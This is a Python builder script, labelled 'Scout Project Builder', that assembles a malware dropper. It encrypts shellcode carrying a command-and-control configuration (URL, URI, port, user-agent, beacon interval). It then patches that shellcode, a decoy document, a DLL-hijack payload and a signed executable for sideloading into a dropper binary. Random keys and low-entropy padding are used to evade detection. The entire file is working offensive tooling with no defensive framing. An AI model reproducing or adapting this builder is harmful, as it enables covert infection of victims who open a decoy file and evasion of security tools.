import argparse
from Crypto.Cipher import ARC4
import os.path
import struct
import os
import random
import string

def u32(v):
    return struct.unpack("<I", v)[0]

def p32(v):
    return struct.pack("<I", v)

def p16(v):
    return struct.pack("<H", v)

def FileExist(file):
    return os.path.isfile(file)

def RC4Encrypt(data, key):
    cipher = ARC4.new(key)
    return cipher.encrypt(data)

def GenerateRandomBytes(length):
    ret = b""
    for i in range(0, length):
        if random.randint(0, 10) % 5 == 0:
            ret += b"\xC3"
        else:
            ret += b"\xCC"
    
    return ret
    #return bytes(random.choice([0x00, 0xCC]) for _ in range(length))

def GenerateRandomString(length=10):
    # Create a string of all possible characters
    characters = string.ascii_letters + string.digits
    # Randomly select characters from the pool
    rndString = ''.join(random.choice(characters) for _ in range(length))
    return rndString
    
def Build(args):
    if FileExist("./bins/shellcode.bin") == False:
        print("[-] shellcode.bin is missing")
        return
    f = open("./bins/shellcode.bin", "rb")
    shellcode = f.read()
    f.close()
    
    config = b""
    if len(args.url) > 99:
        print("[-] Url too long. Max 99")
        return
        
    config += args.url.ljust(100, "\x00").encode("utf-16")[2:]
    if len(args.uri) > 99:
        print("[-] Uri too long. Max 99")
        return
    
    config += args.uri.ljust(100, "\x00").encode("utf-16")[2:]
    if len(args.useragent) > 199:
        print("[-] User-Agent too long. Max 199")
        return
    
    config += args.useragent.ljust(200, "\x00").encode("utf-16")[2:]
    config += p16(args.port)
    config += p32(args.sleep)
    
    shellcode += config
    encryptedShellcode = RC4Encrypt(shellcode, b"bPqVszDnkkeueWXq")

    print("[+] Encrypted shellcode with config is ready")
    
    if FileExist("./bins/dropper.exe") == False:
        print("[-] dropper.exe is missing")
        return
    
    f = open("./bins/dropper.exe", "rb")
    dropperBin = f.read()
    f.close()

    if FileExist(args.decoy) == False:
        print("[-] Decoy doc is missing")
        return
    
    f = open(args.decoy, "rb")
    decoyDoc = f.read()
    f.close()
    
    defaultDocKey = b"defaultdockey"
    newDocKey = GenerateRandomString(len(defaultDocKey)).encode()
    encryptedDecoyDoc = RC4Encrypt(decoyDoc, newDocKey)
    header = bytes([0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x85, 0xD2, 0x74, 0x45, 0x81, 0xFA, 0xFF, 0xFF, 0xFF, 0x7F, 0x77, 0x3D, 0x56, 0x57, 0x8B, 0x7D, 0x08, 0xBE, 0xFE, 0xFE])
    
    decoyDocOffset = dropperBin.find(header, 0)
    decoyDocMaxSize = u32(dropperBin[decoyDocOffset + len(header):decoyDocOffset + len(header) + 4])
    if len(encryptedDecoyDoc) > decoyDocMaxSize:
        print("[-] Decoy doc's size is too big. Max is %d bytes" % decoyDocMaxSize)
        return
    
    # This is cursed. Also padding with random 0xCC, 0x90 to reduce file entropy
    dropperBin = dropperBin[:decoyDocOffset + len(header)] + p32(len(encryptedDecoyDoc)) + encryptedDecoyDoc + GenerateRandomBytes(decoyDocMaxSize - len(encryptedDecoyDoc)) + dropperBin[decoyDocOffset + len(header) + 4 + decoyDocMaxSize:]
    
    # Replace default doc key
    defaultDocKeyOffset = dropperBin.find(defaultDocKey, 0)
    dropperBin = dropperBin[:defaultDocKeyOffset] + newDocKey + dropperBin[defaultDocKeyOffset + len(defaultDocKey):]
    print("[+] Replace decoy doc OK")
    
    defaultRegistryKey = b"defaultregistrykey"
    newRegistryKey = GenerateRandomString(len(defaultRegistryKey)).encode()
    
    header = bytes([0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x85, 0xD2, 0x74, 0x45, 0x81, 0xFA, 0xFF, 0xFF, 0xFF, 0x7F, 0x77, 0x3D, 0x56, 0x57, 0x8B, 0x7D, 0x08, 0xBE, 0xFE, 0xFF])
    encryptedShellcode = RC4Encrypt(encryptedShellcode, newRegistryKey)
    shellcodeOffset = dropperBin.find(header, 0)
    shellcodeMaxSize = u32(dropperBin[shellcodeOffset + len(header):shellcodeOffset + len(header) + 4])
    if len(encryptedShellcode) > shellcodeMaxSize:
        print("[-] Shellcode's size is too big. Max is %d bytes" % shellcodeMaxSize)
        return
    
    # This is cursed again
    dropperBin = dropperBin[:shellcodeOffset + len(header)] + p32(len(encryptedShellcode)) + encryptedShellcode + GenerateRandomBytes(shellcodeMaxSize - len(encryptedShellcode)) + dropperBin[shellcodeOffset + len(header) + 4 + shellcodeMaxSize:]
    
    # Replace default registry key
    defaultRegistryKeyOffset = dropperBin.find(defaultRegistryKey, 0)
    dropperBin = dropperBin[:defaultRegistryKeyOffset] + newRegistryKey + dropperBin[defaultRegistryKeyOffset + len(defaultRegistryKey):]
    
    print("[+] Replace shellcode OK")
    
    if FileExist("./bins/hijack.dll") == False:
        print("[-] hijack.dll is missing")
        return
    
    f = open("./bins/hijack.dll", "rb")
    wcsDll = f.read()
    f.close()
    
    defaultDllKey = b"defaultdllkey"
    newDllKey = GenerateRandomString(len(defaultDllKey)).encode()
    
    encryptedWscDll = RC4Encrypt(wcsDll, newDllKey)
    header = bytes([0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x85, 0xD2, 0x74, 0x45, 0x81, 0xFA, 0xFF, 0xFF, 0xFF, 0x7F, 0x77, 0x3D, 0x56, 0x57, 0x8B, 0x7D, 0x08, 0xBE, 0xFE, 0xF0])
    wscOffset = dropperBin.find(header, 0)
    wscMaxSize = u32(dropperBin[wscOffset + len(header):wscOffset + len(header) + 4])
    if len(encryptedWscDll) > wscMaxSize:
        print("[-] hijack.dll's size is too big. Max is %d bytes" % wscMaxSize)
        return
    
    dropperBin = dropperBin[:wscOffset + len(header)] + p32(len(encryptedWscDll)) + encryptedWscDll + GenerateRandomBytes(wscMaxSize - len(encryptedWscDll)) + dropperBin[wscOffset + len(header) + 4 + wscMaxSize:]
    
    # Replace default dll key
    defaultDllKeyOffset = dropperBin.find(defaultDllKey, 0)
    dropperBin = dropperBin[:defaultDllKeyOffset] + newDllKey + dropperBin[defaultDllKeyOffset + len(defaultDllKey):]
    
    print("[+] Replace hijack.dll OK")
    
    if FileExist("./bins/signed.exe") == False:
        print("[-] signed.exe is missing")
        return
    
    f = open("./bins/signed.exe", "rb")
    signedExe = f.read()
    f.close()
    
    defaultExeKey = b"defaultexekey"
    newExeKey = GenerateRandomString(len(defaultExeKey)).encode()
    encryptedSignedExe = RC4Encrypt(signedExe, newExeKey)
    header = bytes([0x8B, 0xFF, 0x55, 0x8B, 0xEC, 0x85, 0xD2, 0x74, 0x45, 0x81, 0xFA, 0xFF, 0xFF, 0xFF, 0x7F, 0x77, 0x3D, 0x56, 0x57, 0x8B, 0x7D, 0x08, 0xBE, 0xFE, 0xAB])
    signedExeOffset = dropperBin.find(header, 0)
    signedExeMaxSize = u32(dropperBin[signedExeOffset + len(header):signedExeOffset + len(header) + 4])
    if len(encryptedSignedExe) > signedExeMaxSize:
        print("[-] signed.exe's size is too big. Max is %d bytes" % signedExeMaxSize)
        return
    
    dropperBin = dropperBin[:signedExeOffset + len(header)] + p32(len(encryptedSignedExe)) + encryptedSignedExe + GenerateRandomBytes(signedExeMaxSize - len(encryptedSignedExe)) + dropperBin[signedExeOffset + len(header) + 4 + signedExeMaxSize:]
    
    # Replace default exe key
    defaultExeKeyOffset = dropperBin.find(defaultExeKey, 0)
    dropperBin = dropperBin[:defaultExeKeyOffset] + newExeKey + dropperBin[defaultExeKeyOffset + len(defaultExeKey):]
    
    print("[+] Replace signed.exe OK")
    
    f = open(args.output, "wb")
    f.write(dropperBin)
    f.close()
    
    print("[+] Build file to '%s'" % args.output)
    
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Scout Project Builder")
    parser.add_argument("--url", help="C2 url", required=True)
    parser.add_argument("--uri", help="C2 uri", default="/admin/edit/upload_image.aspx")
    parser.add_argument("--port", help="Port for POST request to C2", type=int, default=80)
    parser.add_argument("--decoy", help="Decoy doc file to display", required=True)
    parser.add_argument("--useragent", help="User-Agent for POST packet to C2 server", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.6312.122 Safari/537.36")
    parser.add_argument("--sleep", help="Sleep time. Delay time between each POST to C2", default=10)
    parser.add_argument("--output", help="Output file", required=True)
    args = parser.parse_args()

    Build(args)